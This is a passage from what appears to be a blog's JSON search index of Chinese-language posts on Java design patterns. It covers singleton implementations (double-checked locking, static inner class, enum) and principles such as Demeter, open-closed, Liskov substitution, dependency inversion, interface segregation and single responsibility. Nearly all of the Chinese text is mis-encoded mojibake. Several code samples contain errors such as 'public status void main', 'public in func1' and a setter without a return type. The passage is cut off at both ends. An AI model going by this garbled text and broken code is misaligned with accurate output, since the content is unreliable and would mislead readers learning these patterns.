å¦ä¸€ä¸ªçº¿ç¨‹ä¹Ÿé€šè¿‡äº†è¿™ä¸ªåˆ¤æ–­è¯­å¥ï¼Œè¿™æ—¶ä¾¿ä¼šäº§ç”Ÿå¤šä¸ªå®ä¾‹ ç»“è®ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼ åŒé‡æ£€æŸ¥img //æ‡’æ±‰å¼(çº¿ç¨‹å®‰å…¨,åŒé‡æ£€æŸ¥) class SingleTon6 { //å¿…é¡»åŠ volatileå…³é”®å­—çš„åŸå› ï¼šnewå¯¹è±¡åˆ†ä¸º3æ­¥:1.åˆ†é…ç©ºé—´ 2.åˆå§‹åŒ–å¯¹è±¡ 3.æŒ‡å‘å¯¹è±¡å†…å­˜åœ°å€ // 2å’Œ3å¯èƒ½è¢«ç¼–è¯‘å™¨è‡ªåŠ¨é‡æ’åº,å¯¼è‡´åˆ¤æ–­éç©ºä½†æ˜¯å®é™…æ‹¿çš„å¯¹è±¡è¿˜æœªå®Œæˆåˆå§‹åŒ– private static volatile SingleTon6 instance; private SingleTon6() { } //æä¾›ä¸€ä¸ªé™æ€çš„å…¬æœ‰æ–¹æ³•,åŠ å…¥åŒé‡æ£€æŸ¥ä»£ç ï¼Œè§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜,åŒæ—¶è§£å†³æ‡’åŠ è½½çš„é—®é¢˜ public static SingleTon6 getInstance() { if (instance == null) { synchronized (SingleTon6.class) { if (instance == null) { instance = new SingleTon6(); } } } return instance; } } ä¼˜ç¼ºç‚¹è¯´æ˜ï¼š Double-Checkæ¦‚å¿µæ˜¯å¤šçº¿ç¨‹å¼€å‘ä¸­å¸¸ä½¿ç”¨åˆ°çš„ï¼Œå¦‚ä»£ç ä¸­æ‰€ç¤ºï¼Œæˆ‘ä»¬è¿›è¡Œäº†ä¸¤ æ¬¡if (singleton == null)æ£€æŸ¥ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯çº¿ç¨‹å®‰å…¨äº†ã€‚ è¿™æ ·ï¼Œå®ä¾‹åŒ–ä»£ç åªç”¨æ‰§è¡Œä¸€æ¬¡ï¼Œåé¢å†æ¬¡è®¿é—®æ—¶ï¼Œåˆ¤æ–­if (singleton == null)ï¼Œ ç›´æ¥returnå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿé¿å…çš„åå¤è¿›è¡Œæ–¹æ³•åŒæ­¥ çº¿ç¨‹å®‰å…¨ï¼›å»¶è¿ŸåŠ è½½ï¼›æ•ˆç‡è¾ƒé«˜ ç»“è®ºï¼šåœ¨å®é™…å¼€å‘ä¸­ï¼Œæ¨èä½¿ç”¨è¿™ç§å•ä¾‹è®¾è®¡æ¨¡å¼ é™æ€å†…éƒ¨ç±»img //é™æ€å†…éƒ¨ç±» class SingleTon7 { private static volatile SingleTon7 instance; private SingleTon7() { } //å†™ä¸€ä¸ªé™æ€å†…éƒ¨ç±»,è¯¥ç±»ä¸­æœ‰ä¸€ä¸ªé™æ€å±æ€§SingleTon7 //é™æ€å†…éƒ¨ç±»SingletonInstanceåœ¨å¤–éƒ¨ç±»SingleTon7åœ¨ç±»è£…è½½çš„æ—¶å€™,å¹¶ä¸ä¼šé©¬ä¸Šæ‰§è¡Œ,ä¸ä¼šå¯¼è‡´é™æ€å†…éƒ¨ç±»SingletonInstanceé©¬ä¸Šè£…è½½ //åœ¨JVMä¸­ï¼Œç±»çš„è½¬è½½æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯¼è‡´äº†INSTANCEçš„åˆå§‹åŒ–æ˜¯çº¿ç¨‹å®‰å…¨çš„ private static class SingletonInstance { private static final SingleTon7 INSTANCE = new SingleTon7(); } public static SingleTon7 getInstance() { //å½“è°ƒç”¨getInstanceè¿™ä¸ªæ–¹æ³•æ—¶,ä¼šå»å–é™æ€å†…éƒ¨ç±»SingletonInstanceé‡Œçš„INSTANCEå±æ€§,è¿™æ—¶ä¼šå¯¼è‡´SingletonInstanceä¼šè¢«è£…è½½ return SingletonInstance.INSTANCE; } } ä¼˜ç¼ºç‚¹è¯´æ˜ï¼š è¿™ç§æ–¹å¼é‡‡ç”¨äº†ç±»è£…è½½çš„æœºåˆ¶æ¥ä¿è¯åˆå§‹åŒ–å®ä¾‹æ—¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚ é™æ€å†…éƒ¨ç±»æ–¹å¼åœ¨Singletonç±»è¢«è£…è½½æ—¶å¹¶ä¸ä¼šç«‹å³å®ä¾‹åŒ–ï¼Œè€Œæ˜¯åœ¨éœ€è¦å®ä¾‹åŒ– æ—¶ï¼Œè°ƒç”¨getInstanceæ–¹æ³•ï¼Œæ‰ä¼šè£…è½½SingletonInstanceç±»ï¼Œä»è€Œå®ŒæˆSingletonçš„ å®ä¾‹åŒ–ã€‚ ç±»çš„é™æ€å±æ€§åªä¼šåœ¨ç¬¬ä¸€æ¬¡åŠ è½½ç±»çš„æ—¶å€™åˆå§‹åŒ–ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œï¼ŒJVMå¸®åŠ©æˆ‘ä»¬ ä¿è¯äº†çº¿ç¨‹çš„å®‰å…¨æ€§ï¼Œåœ¨ç±»è¿›è¡Œåˆå§‹åŒ–æ—¶ï¼Œåˆ«çš„çº¿ç¨‹æ˜¯æ— æ³•è¿›å…¥çš„ã€‚ ä¼˜ç‚¹ï¼šé¿å…äº†çº¿ç¨‹ä¸å®‰å…¨ï¼Œåˆ©ç”¨é™æ€å†…éƒ¨ç±»ç‰¹ç‚¹å®ç°å»¶è¿ŸåŠ è½½ï¼Œæ•ˆç‡é«˜ ç»“è®ºï¼šæ¨èä½¿ç”¨. æšä¸¾img /** * @Author: Wizard * @Date: 2020/6/6 14:38 */ public class Singleton8 { public static void main(String[] args) { Singleton instance = Singleton.INSTANCE; Singleton instance2 = Singleton.INSTANCE; System.out.println(instance == instance2);//true System.out.println(instance.hashCode()); System.out.println(instance2.hashCode()); } } //æšä¸¾ enum Singleton { INSTANCE; public void ok() { System.out.println(&quot;ok&quot;); } } ä¼˜ç¼ºç‚¹è¯´æ˜ï¼š è¿™å€ŸåŠ©JDK1.5ä¸­æ·»åŠ çš„æšä¸¾æ¥å®ç°å•ä¾‹æ¨¡å¼ã€‚ä¸ä»…èƒ½é¿å…å¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ï¼Œè€Œ ä¸”è¿˜èƒ½é˜²æ­¢ååºåˆ—åŒ–é‡æ–°åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚ è¿™ç§æ–¹å¼æ˜¯Effective Javaä½œè€…Josh Bloch æå€¡çš„æ–¹å¼ ç»“è®ºï¼šæ¨èä½¿ç”¨ å•ä¾‹æ¨¡å¼åœ¨JDK åº”ç”¨çš„æºç åˆ†æå•ä¾‹æ¨¡å¼åœ¨JDK åº”ç”¨çš„æºç åˆ†æ JDKä¸­ï¼Œjava.lang.Runtimeå°±æ˜¯ç»å…¸çš„å•ä¾‹æ¨¡å¼(é¥¿æ±‰å¼) å•ä¾‹æ¨¡å¼æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚è¯´æ˜ å•ä¾‹æ¨¡å¼ä¿è¯äº† ç³»ç»Ÿå†…å­˜ä¸­è¯¥ç±»åªå­˜åœ¨ä¸€ä¸ªå¯¹è±¡ï¼ŒèŠ‚çœäº†ç³»ç»Ÿèµ„æºï¼Œå¯¹äºä¸€äº›éœ€ è¦é¢‘ç¹åˆ›å»ºé”€æ¯çš„å¯¹è±¡ï¼Œä½¿ç”¨å•ä¾‹æ¨¡å¼å¯ä»¥æé«˜ç³»ç»Ÿæ€§èƒ½ å½“æƒ³å®ä¾‹åŒ–ä¸€ä¸ªå•ä¾‹ç±»çš„æ—¶å€™ï¼Œå¿…é¡»è¦è®°ä½ä½¿ç”¨ç›¸åº”çš„è·å–å¯¹è±¡çš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯ä½¿ç”¨new å•ä¾‹æ¨¡å¼ä½¿ç”¨çš„åœºæ™¯ï¼šéœ€è¦é¢‘ç¹çš„è¿›è¡Œåˆ›å»ºå’Œé”€æ¯çš„å¯¹è±¡ã€åˆ›å»ºå¯¹è±¡æ—¶è€—æ—¶è¿‡å¤šæˆ– è€—è´¹èµ„æºè¿‡å¤š(å³ï¼šé‡é‡çº§å¯¹è±¡)ï¼Œä½†åˆç»å¸¸ç”¨åˆ°çš„å¯¹è±¡ã€å·¥å…·ç±»å¯¹è±¡ã€é¢‘ç¹è®¿é—®æ•° æ®åº“æˆ–æ–‡ä»¶çš„å¯¹è±¡(æ¯”å¦‚æ•°æ®æºã€sessionå·¥å‚ç­‰)","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"åˆæˆå¤ç”¨åŸåˆ™","slug":"åˆæˆå¤ç”¨åŸåˆ™","date":"2020-06-04T23:42:54.000Z","updated":"2021-04-11T17:11:28.792Z","comments":true,"path":"åˆæˆå¤ç”¨åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E5%90%88%E6%88%90%E5%A4%8D%E7%94%A8%E5%8E%9F%E5%88%99/","excerpt":"åˆæˆå¤ç”¨åŸåˆ™ Composite Resue Principle","text":"åˆæˆå¤ç”¨åŸåˆ™ Composite Resue Principle åŸºæœ¬ä»‹ç»åŸåˆ™æ˜¯å°½é‡ä½¿ç”¨åˆæˆ/èšåˆçš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»§æ‰¿ã€‚ 1591350916399 ä¸ä½¿ç”¨ç»§æ‰¿çš„æ–¹æ³•ï¼š ä½¿ç”¨: 1.ä¾èµ–(å‚æ•°ä¼ é€’) 2.èšåˆ(set) 3.ç»„åˆ(new) è®¾è®¡åŸåˆ™æ ¸å¿ƒæ€æƒ³ æ‰¾å‡ºåº”ç”¨ä¸­å¯èƒ½éœ€è¦å˜åŒ–ä¹‹å¤„ï¼ŒæŠŠä»–ä»¬ç‹¬ç«‹å‡ºæ¥ï¼Œä¸è¦å’Œé‚£äº›ä¸éœ€è¦å˜åŒ–çš„ä»£ç æ··åœ¨ä¸€èµ·ã€‚ é’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯é’ˆå¯¹å®ç°ç¼–ç¨‹ ä¸ºäº†äº¤äº’å¯¹è±¡ä¹‹é—´çš„æ¾è€¦åˆè®¾è®¡è€ŒåŠªåŠ›","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è¿ªç±³ç‰¹æ³•åˆ™","slug":"è¿ªç±³ç‰¹æ³•åˆ™","date":"2020-06-04T19:09:31.000Z","updated":"2021-04-11T17:11:29.059Z","comments":true,"path":"è¿ªç±³ç‰¹æ³•åˆ™/","link":"","permalink":"https://blog.kayleh.top/%E8%BF%AA%E7%B1%B3%E7%89%B9%E6%B3%95%E5%88%99/","excerpt":"åŸºæœ¬ä»‹ç» Demeter Principle","text":"åŸºæœ¬ä»‹ç» Demeter Principle ä¸€ä¸ªå¯¹è±¡åº”è¯¥å¯¹å…¶ä»–å¯¹è±¡ä¿æŒæœ€å°‘çš„äº†è§£ ç±»ä¸ç±»å…³ç³»è¶Šå¯†åˆ‡ï¼Œè€¦åˆåº¦è¶Šå¤§ è¿ªç±³ç‰¹æ³•åˆ™åˆå«æœ€å°‘çŸ¥é“åŸåˆ™ï¼Œå³ä¸€ä¸ªç±»å¯¹è‡ªå·±ä¾èµ–çš„ç±»çŸ¥é“çš„ è¶Šå°‘è¶Šå¥½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºè¢«ä¾èµ–çš„ç±»ä¸ç®¡å¤šä¹ˆå¤æ‚ï¼Œéƒ½å°½é‡å°†é€»è¾‘å°è£…åœ¨ç±»çš„å†… éƒ¨ã€‚å¯¹å¤–é™¤äº†æä¾›çš„public æ–¹æ³•ï¼Œä¸å¯¹å¤–æ³„éœ²ä»»ä½•ä¿¡æ¯ è¿ªç±³ç‰¹æ³•åˆ™è¿˜æœ‰ä¸ªæ›´ç®€å•çš„å®šä¹‰ï¼šåªä¸ç›´æ¥çš„æœ‹å‹é€šä¿¡ ç›´æ¥çš„æœ‹å‹ï¼šæ¯ä¸ªå¯¹è±¡éƒ½ä¼šä¸å…¶ä»–å¯¹è±¡æœ‰è€¦åˆå…³ç³»ï¼Œåªè¦ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æœ‰è€¦åˆå…³ç³»ï¼Œ æˆ‘ä»¬å°±è¯´è¿™ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æ˜¯æœ‹å‹å…³ç³»ã€‚è€¦åˆçš„æ–¹å¼å¾ˆå¤šï¼Œä¾èµ–ï¼Œå…³è”ï¼Œç»„åˆï¼Œèšåˆ ç­‰ã€‚å…¶ä¸­ï¼Œæˆ‘ä»¬ç§°å‡ºç°æˆå‘˜å˜é‡ï¼Œæ–¹æ³•å‚æ•°ï¼Œæ–¹æ³•è¿”å›å€¼ä¸­çš„ç±»ä¸ºç›´æ¥çš„æœ‹å‹ï¼Œè€Œ å‡ºç°åœ¨å±€éƒ¨å˜é‡ä¸­çš„ç±»ä¸æ˜¯ç›´æ¥çš„æœ‹å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé™Œç”Ÿçš„ç±»æœ€å¥½ä¸è¦ä»¥å±€éƒ¨å˜é‡ çš„å½¢å¼å‡ºç°åœ¨ç±»çš„å†…éƒ¨ã€‚ ç»†èŠ‚ï¼š è¿ªç±³ç‰¹æ³•åˆ™çš„æ ¸å¿ƒæ˜¯é™ä½ç±»ä¹‹é—´çš„è€¦åˆ æ³¨æ„ï¼šç”±äºæ¯ä¸ªç±»éƒ½å‡å°‘äº†ä¸å¿…è¦çš„ä¾èµ–ï¼Œå› æ­¤è¿ªç±³ç‰¹æ³•åˆ™åªæ˜¯è¦æ±‚é™ä½ ç±»é—´(å¯¹è±¡é—´)è€¦åˆå…³ç³»ï¼Œ å¹¶ä¸æ˜¯è¦æ±‚å®Œå…¨æ²¡æœ‰ä¾èµ–å…³ç³»","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å¼€é—­åŸåˆ™","slug":"å¼€é—­åŸåˆ™","date":"2020-06-04T17:07:12.000Z","updated":"2021-04-11T17:11:28.870Z","comments":true,"path":"å¼€é—­åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99/","excerpt":"å¼€é—­åŸåˆ™ Open Closed Principle åŸºæœ¬ä»‹ç»","text":"å¼€é—­åŸåˆ™ Open Closed Principle åŸºæœ¬ä»‹ç» å¼€é—­åŸåˆ™æ˜¯ç¼–ç¨‹ä¸­æœ€åŸºç¡€ã€æœ€é‡è¦çš„è®¾è®¡åŸåˆ™ ä¸€ä¸ªè½¯ä»¶å®ä½“å¦‚ç±»ï¼Œæ¨¡å—å’Œå‡½æ•°åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚ç”¨æŠ½è±¡æ„å»ºæ¡†æ¶ï¼Œç”¨å®ä½“æ‰©å±•ç»†èŠ‚ã€‚ å½“è½¯ä»¶éœ€è¦å˜åŒ–æ—¶ï¼Œå°½é‡é€šè¿‡æ‰©å±•è½¯ä»¶å®ä½“çš„è¡Œä¸ºæ¥å®ç°å˜åŒ–ï¼Œè€Œä¸æ˜¯é€šè¿‡ä¿®æ”¹å·²æœ‰çš„ä»£ç æ¥å®ç°å˜åŒ–ã€‚ ç¼–ç¨‹ä¸­éµå¾ªå…¶ä»–åŸåˆ™ï¼Œä»¥åŠä½¿ç”¨è®¾è®¡æ¨¡å¼çš„ç›®çš„å°±æ˜¯éµå¾ªå¼€é—­åŸåˆ™ã€‚ public class Ocp{ public status void main(String[] args){ GraphicEditor graphicEditor = new GraphicEditor(); graphicEditor.drawShape(new Rectangle()); } } class GraphicEditor{ public void drawShape(Shape shape){ shape.draw(); } } //Shapeç±»ï¼ŒåŸºç±» abstract class Shape{ int m_type; public abstract void draw();//æŠ½è±¡æ–¹æ³• } class Rectangle extends Shape{ Rectangle(){ super.m_type = 1; } @Override public void draw(){ System.out.println(&quot;ç»˜åˆ¶çŸ©å½¢&quot;) } } class Circle extends Shape{ Circle(){ super.m_type = 2; } @Override public void draw(){ System.out.println(&quot;ç»˜åˆ¶åœ†å½¢&quot;) } }","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"é‡Œæ°æ›¿æ¢åŸåˆ™","slug":"é‡Œæ°æ›¿æ¢åŸåˆ™","date":"2020-06-04T02:13:11.000Z","updated":"2021-04-11T17:11:29.072Z","comments":true,"path":"é‡Œæ°æ›¿æ¢åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E9%87%8C%E6%B0%8F%E6%9B%BF%E6%8D%A2%E5%8E%9F%E5%88%99/","excerpt":"é‡Œæ°æ›¿æ¢åŸåˆ™ Liskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™åœ¨1988å¹´ï¼Œç”±éº»çœç†å·¥å­¦é™¢çš„ä¸€ä½å§“é‡Œçš„å¥³å£«æå‡ºçš„ã€‚","text":"é‡Œæ°æ›¿æ¢åŸåˆ™ Liskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™åœ¨1988å¹´ï¼Œç”±éº»çœç†å·¥å­¦é™¢çš„ä¸€ä½å§“é‡Œçš„å¥³å£«æå‡ºçš„ã€‚ å¦‚æœå¯¹æ¯ä¸ªç±»å‹ä¸ºT1çš„å¯¹è±¡o1ï¼Œéƒ½æœ‰ç±»å‹ä¸ºT2çš„å¯¹è±¡o2ï¼Œä½¿å¾—ä»¥T1å®šä¹‰çš„æ‰€æœ‰ç¨‹åºPåœ¨æ‰€æœ‰çš„å¯¹è±¡o1éƒ½ä»£æ¢æˆo2æ—¶ï¼Œç¨‹åºPçš„è¡Œä¸ºæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆç±»å‹T2æ˜¯ç±»å‹T1çš„å­ç±»å‹ã€‚æ‰€æœ‰å¼•ç”¨åŸºç±»çš„åœ°æ–¹å¿…é¡»èƒ½é€æ˜åœ°ä½¿ç”¨å…¶å­ç±»çš„å¯¹è±¡ã€‚æ¢å¥è¯è¯´ï¼Œæ—¢ç„¶æŠ½è±¡å‡ºæ¥å½“ä½œå…±åŒçš„å®ç°æ–¹æ³•å°±ä¸åº”å†å…·ä½“å®ç°ç±»ä¸­é‡å†™ã€‚ åœ¨ä½¿ç”¨ç»§æ‰¿æ—¶ï¼Œéµå®ˆé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œåœ¨å­ç±»ä¸­å°½é‡ä¸è¦é‡å†™çˆ¶ç±»çš„æ–¹æ³• é‡Œæ°æ›¿æ¢åŸåˆ™å‘Šè¯‰æˆ‘ä»¬ï¼Œç»§æ‰¿å®é™…ä¸Šè®©ä¸¤ä¸ªç±»è€¦åˆæ€§å¢å¼ºäº†ï¼Œåœ¨é€‚å½“çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡èšåˆï¼Œç»„åˆï¼Œä¾èµ–æ¥è§£å†³é—®é¢˜ã€‚ //Aç±» class A{ //è¿”å›ä¸¤ä¸ªæ•°çš„å·® public in func1(int num1,int num2){ return num1 - num2; } } //Bç±»ç»§æ‰¿äº†Aç±» class B extends A{ // â†“é‡å†™äº†Açš„æ–¹æ³• public int func1(int a,int b){ return a + b; } public int func2(int a,int b){ return func1(a,b)+9; } } æ”¹è¿›ï¼š class Base{ //æŠŠæ›´åŠ åŸºç¡€çš„æ–¹æ³•å’Œæˆå‘˜å†™åˆ°Baseç±» } //Aç±» class A extends Base{ //è¿”å›ä¸¤ä¸ªæ•°çš„å·® public in func1(int num1,int num2){ return num1 - num2; } } //Bç±»ç»§æ‰¿äº†Aç±» class B extends Base{ //å¦‚æœBéœ€è¦ä½¿ç”¨Aç±»çš„æ–¹æ³•ï¼Œä½¿ç”¨ç»„åˆå…³ç³» private A a = new A(); // â†“é‡å†™äº†Açš„æ–¹æ³• public int func1(int a,int b){ return a + b; } public int func2(int a,int b){ return func1(a,b)+9; } //ä½¿ç”¨Açš„æ–¹æ³• public int func3(int a,int b){ return this.a.func1(a,b); } }","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"ä¾èµ–å€’è½¬åŸåˆ™","slug":"ä¾èµ–å€’è½¬åŸåˆ™","date":"2020-06-03T04:29:20.000Z","updated":"2021-04-11T17:11:28.608Z","comments":true,"path":"ä¾èµ–å€’è½¬åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E4%BE%9D%E8%B5%96%E5%80%92%E8%BD%AC%E5%8E%9F%E5%88%99/","excerpt":"ä¾èµ–å€’è½¬åŸåˆ™ Dependence Inversion Priciple","text":"ä¾èµ–å€’è½¬åŸåˆ™ Dependence Inversion Priciple åŸºæœ¬ä»‹ç» é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–ä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–å…¶æŠ½è±¡ æŠ½è±¡ä¸åº”è¯¥ä¾èµ–ç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–æŠ½è±¡ ä¾èµ–å€’è½¬çš„ä¸­å¿ƒæ€æƒ³æ˜¯é¢å‘æ¥å£ç¼–ç¨‹ ä¾èµ–å€’è½¬åŸåˆ™æ˜¯åŸºäºè¿™æ ·çš„è®¾è®¡ç†å¿µï¼šç›¸å¯¹äºç»†èŠ‚çš„å¤šå˜æ€§ï¼ŒæŠ½è±¡çš„ä¸œè¥¿è¦ç¨³å®šçš„å¤šã€‚ä»¥æŠ½è±¡ä¸ºåŸºç¡€æ­å»ºçš„æ¶æ„æ¯”ç»†èŠ‚ä¸ºåŸºç¡€çš„æ¶æ„è¦ç¨³å®šçš„å¤šã€‚åœ¨javaä¸­ï¼ŒæŠ½è±¡æŒ‡çš„æ˜¯æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œç»†èŠ‚å°±æ˜¯å…·ä½“çš„å®ç°ç±» ä½¿ç”¨æ¥å£æˆ–æŠ½è±¡ç±»çš„ç›®çš„æ˜¯åˆ¶å®šå¥½è§„èŒƒï¼Œè€Œä¸æ¶‰åŠä»»ä½•å…·ä½“çš„æ“ä½œï¼ŒæŠŠå±•ç°ç»†èŠ‚çš„ä»»åŠ¡äº¤ç»™ä»–ä»¬çš„å®ç°ç±»å»å®Œæˆ ç»†èŠ‚ ä½å±‚æ¨¡å—å°½é‡éƒ½è¦æœ‰æŠ½è±¡ç±»æˆ–æ¥å£ï¼Œæˆ–è€…ä¸¤è€…éƒ½æœ‰ï¼Œç¨‹åºç¨³å®šæ€§æ›´å¥½ å˜é‡çš„å£°æ˜ç±»å‹å°½é‡æ˜¯æŠ½è±¡ç±»æˆ–æ¥å£ï¼Œè¿™æ ·æˆ‘ä»¬çš„å˜é‡å¼•ç”¨å’Œå®é™…å¯¹è±¡é—´ï¼Œå°±å­˜åœ¨ä¸€ä¸ªç¼“å†²å±‚ã€‚åˆ©äºç¨‹åºæ‰©å±•å’Œä¼˜åŒ– ç»§æ‰¿æ—¶éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ 1é€šè¿‡æ¥å£ä¼ é€’å®ç°ä¾èµ–interface IOpenAndClose{ //æŠ½è±¡æ–¹æ³• public void open(ITV tv); } interface ITV{ //ITVæ¥å£ public void play(); } class Htc implements ITV{ @Override public void play() { System.out.println(&quot;htcç”µè§†æœºï¼Œæ‰“å¼€&quot;); } } //å®ç°æ¥å£ class OpenAndClose implements IOpenAndClose{ public void open(ITV tv){ tv.play(); } } 2.é€šè¿‡æ„é€ æ–¹æ³•ä¾èµ–ä¼ é€’interface IOpenAndClose{ //æŠ½è±¡æ–¹æ³• public void open(ITV tv); } interface ITV{ //ITVæ¥å£ public void play(); } class Htc implements ITV{ @Override public void play() { System.out.println(&quot;htcç”µè§†æœºï¼Œæ‰“å¼€&quot;); } } //å®ç°æ¥å£ class OpenAndClose implements IOpenAndClose{ public ITV tv; public OpenAndClose(ITV tv){ //æ„é€ å™¨ this.tv = tv; } public void open(){ tv.play(); } } 3.é€šè¿‡setteræ–¹æ³•ä¼ é€’interface IOpenAndClose{ //æŠ½è±¡æ–¹æ³• public void open(ITV tv); public void name(ITV tv); } interface ITV{ //ITVæ¥å£ public void play(); } class Htc implements ITV{ @Override public void play() { System.out.println(&quot;htcç”µè§†æœºï¼Œæ‰“å¼€&quot;); } } //å®ç°æ¥å£ class OpenAndClose implements IOpenAndClose{ public ITV tv; public setTv(ITV tv){ //æ„é€ å™¨ this.tv = tv; } public void open(){ tv.play(); } }","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"æ¥å£éš”ç¦»åŸåˆ™","slug":"æ¥å£éš”ç¦»åŸåˆ™","date":"2020-06-03T01:56:04.000Z","updated":"2021-04-11T17:11:28.886Z","comments":true,"path":"æ¥å£éš”ç¦»åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E6%8E%A5%E5%8F%A3%E9%9A%94%E7%A6%BB%E5%8E%9F%E5%88%99/","excerpt":"æ¥å£éš”ç¦»åŸåˆ™ Interface Segregation Principle","text":"æ¥å£éš”ç¦»åŸåˆ™ Interface Segregation Principle åŸºæœ¬ä»‹ç» å®¢æˆ·ç«¯ä¸åº”è¯¥ä¾èµ–å®ƒä¸éœ€è¦çš„æ¥å£ï¼Œå³ä¸€ä¸ªç±»å¯¹å¦ä¸€ä¸ªç±»çš„ä¾èµ–åº”è¯¥å»ºç«‹åœ¨æœ€å°çš„æ¥å£ä¸Šã€‚ ç±»Aé€šè¿‡æ¥å£Interfaceä¾èµ–ç±»Dï¼Œç±»Cé€šè¿‡æ¥å£Interfaceä¾èµ–ç±»Dï¼Œå¦‚æœæ¥å£Interfaceå¯¹äºç±»Aå’Œæ¥è¯´ä¸æ˜¯æœ€å°æ¥å£é‚£ä¹ˆç±»Bå’Œç±»Då¿…é¡»å»å®ç°ä»–ä»¬ä¸éœ€è¦çš„æ–¹æ³•ã€‚ æŒ‰éš”ç¦»åŸåˆ™åº”å½“è¿™æ ·å¤„ç†ï¼š å°†æ¥å£Interfaceæ‹†åˆ†ä¸ºç‹¬ç«‹çš„å‡ ä¸ªæ¥å£ï¼Œç±»Aå’Œç±»Cåˆ†åˆ«ä¸ä»–ä»¬éœ€è¦çš„æ¥å£å»ºç«‹ä¾èµ–å…³ç³»ã€‚ä¹Ÿå°±æ˜¯é‡‡ç”¨æ¥å£éš”ç¦»åŸåˆ™ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å•ä¸€èŒè´£åŸåˆ™","slug":"å•ä¸€èŒè´£åŸåˆ™","date":"2020-06-03T00:57:48.000Z","updated":"2021-04-11T17:11:28.772Z","comments":true,"path":"å•ä¸€èŒè´£åŸåˆ™/","link":"","permalink":"https://blog.kayleh.top/%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99/","excerpt":"å•ä¸€èŒè´£åŸåˆ™","text":"å•ä¸€èŒè´£åŸåˆ™ åŸºæœ¬ä»‹ç» å¯¹ç±»æ¥è¯´ï¼Œå³ä¸€ä¸ªç±»åº”è¯¥åªè´Ÿè´£ä¸€ä¸ªåŸåˆ™ã€‚å¦‚æœAè´Ÿè´£ä¸¤ä¸ªä¸åŒçš„åŸåˆ™ï¼šèŒè´£1ï¼ŒèŒè´£2ã€‚å½“èŒè´£1éœ€æ±‚å˜æ›´è€Œæ”¹å˜Aæ—¶ï¼Œå¯èƒ½å¯¼è‡´èŒè´£2æ‰§è¡Œé”™è¯¯ã€‚æ‰€ä»¥éœ€è¦å°†ç±»Açš„ç²’åº¦åˆ†è§£ä¸ºA1ï¼ŒA2 ç»†èŠ‚ é™ä½ç±»çš„å¤æ‚åº¦ï¼Œä¸€ä¸ªç±»åªè´Ÿè´£ä¸€é¡¹èŒè´£ã€‚ é™ä½ç±»çš„å¯è¯»æ€§ï¼Œå¯ç»´æŠ¤æ€§ã€‚ é™ä½å˜æ›´å¼•èµ·çš„é£é™©ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”å½“éµå®ˆå•ä¸€èŒè´£åŸåˆ™ï¼Œåªæœ‰é€»è¾‘è¶³å¤Ÿç®€å•ï¼Œæ‰å¯ä»¥åœ¨ä»£ç 